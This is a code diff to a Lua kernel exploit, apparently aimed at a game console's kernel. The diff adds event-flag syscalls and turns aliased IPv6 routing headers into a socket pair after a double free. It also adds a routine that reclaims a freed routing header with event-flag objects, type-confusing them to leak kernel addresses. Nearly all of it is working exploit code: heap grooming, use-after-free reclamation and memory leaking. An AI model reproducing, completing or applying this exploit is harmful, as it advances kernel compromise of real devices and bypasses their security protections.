@@ -17,7 +17,12 @@ syscall.resolve({
     cpuset_getaffinity = 0x1e7,
     cpuset_setaffinity = 0x1e8,
     rtprio_thread = 0x1d2,
-    
+
+    evf_create = 0x21a,
+    evf_delete = 0x21b,
+    evf_set = 0x220,
+    evf_clear = 0x221,
+
     thr_suspend_ucontext = 0x278,
     thr_resume_ucontext = 0x279,
 
@@ -297,6 +302,7 @@ NUM_HANDLES = 0x100
 NUM_RACES = 100
 NUM_SDS = 64 -- TODO: change back to 0x100
 NUM_ALIAS = 200
+LEAK_LEN = 16
 
 
 -- max number of requests that can be created/polled/canceled/deleted/waited
@@ -713,10 +719,10 @@ function build_rthdr(buf, size)
     )
     size = bit32.lshift(len + 1, 3)
 
-    memory.write_byte(buf, 0)
-    memory.write_byte(buf+1, len)
-    memory.write_byte(buf+2, 0)
-    memory.write_byte(buf+3, bit32.rshift(len, 1))
+    memory.write_byte(buf, 0) -- ip6r_nxt
+    memory.write_byte(buf+1, len) -- ip6r_len
+    memory.write_byte(buf+2, 0) -- ip6r_type
+    memory.write_byte(buf+3, bit32.rshift(len, 1)) -- ip6r_segleft
 
     return size
 end
@@ -754,11 +760,18 @@ function make_aliased_rthdrs(sds)
         for i=1,NUM_SDS do
             get_rthdr(sds[i], buf, size)
             local marker = memory.read_dword(buf + marker_offset):tonumber()
+            -- dbgf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
             if marker ~= i then
-                printf("aliased rthdrs at attempt: %d", loop)
-                dbgf("marker = %d, i = %d", marker, i)
-                dbgf("found pair: %d %d", sds[i], sds[marker])
-                return true
+                local sd_pair = { sds[i], sds[marker] }
+                printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
+                table.remove(sds, marker)
+                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
+                free_rthdrs(sds)
+                for i=1,2 do
+                    local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+                    table.insert(sds, sock_fd)
+                end
+                return sd_pair
             end
         end
     end
@@ -881,6 +894,111 @@ end
 
 
 
+function new_evf(name, flags)
+    local ret = syscall.evf_create(name, 0, flags):tonumber()
+    if ret == -1 then
+        error("evf_create() error: " .. get_error_string())
+    end
+    return ret
+end
+
+function set_evf_flags(id, flags)
+    if syscall.evf_clear(id, 0):tonumber() == -1 then
+        error("evf_clear() error: " .. get_error_string())
+    end
+    if syscall.evf_set(id, flags):tonumber() == -1 then
+        error("evf_set() error: " .. get_error_string())
+    end
+end
+
+function free_evf(id)
+    if syscall.evf_delete(id):tonumber() == -1 then
+        error("evf_delete() error: " .. get_error_string())
+    end
+end
+
+
+
+
+function leak_kernel_addrs(sd_pair)
+
+    dbg("leak_kernel_addrs() entered")
+
+    local sd = sd_pair[1]
+    local buf = memory.alloc(0x80 * LEAK_LEN)
+
+    -- type confuse a struct evf with a struct ip6_rthdr.
+    -- the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
+    print("confuse evf with rthdr")
+
+    local name = memory.alloc(1)
+
+    -- free one of rthdr
+    syscall.close(sd_pair[2])
+
+    local evf = nil
+    -- for i=1, NUM_ALIAS do
+    for i=1, 1 do
+
+        local evfs = {}
+
+        -- reclaim freed rthdr with evf object
+        for j=1, NUM_HANDLES do
+            local evf_flags = bit32.bor(0xf00, bit32.lshift(j, 16))
+            local evf_id = new_evf(name, evf_flags)
+            -- printf("evf[%d] = %s", j, hex(evf_id))
+            table.insert(evfs, evf_id)
+            -- table.insert(evfs, new_evf(name, evf_flags))
+        end
+
+        get_rthdr(sd, buf, 0x80)
+
+        -- for simplicty, we'll assume i < 2**16
+        local flag_int = memory.read_dword(buf):tonumber()
+        local idx = bit32.rshift(flag_int, 16) 
+        local expected_flag = bit32.bor(flag_int, 1)
+        
+        evf = evfs[idx+1]
+
+        set_evf_flags(evf, expected_flag)
+        get_rthdr(sd, buf, 0x80)
+
+        local val = memory.read_dword(buf):tonumber()
+
+        dbgf("flag_int: %s", hex(flag_int))
+        dbgf("idx: %s", hex(idx))
+        dbgf("expected_flag: %s", hex(expected_flag))
+        dbgf("evf = %s", hex(evf))
+        dbgf("val: %s", hex(val))
+        print("---")
+
+        if val == expected_flag then
+            table.remove(evfs, idx)
+        else
+            evf = nil
+        end
+
+        for j=1, #evfs do
+            free_evf(evfs[j])
+        end
+
+        if evf ~= nil then
+            printf("confused rthdr and evf at attempt: %d", i)
+            break
+        end
+    end
+
+    if evf == nil then
+        error("failed to confuse evf and rthdr")
+    end
+
+
+end
+
+
+
+
+
 function kexploit()
 
     -- pin to 1 core so that we only use 1 per-cpu bucket.
@@ -920,6 +1038,9 @@ function kexploit()
     
         print("[+] Double-free AIO")
         local sd_pair = double_free_reqs2(sds)
+
+        print("[+] Leak kernel addresses")
+        leak_kernel_addrs(sd_pair)
     
     end)
 
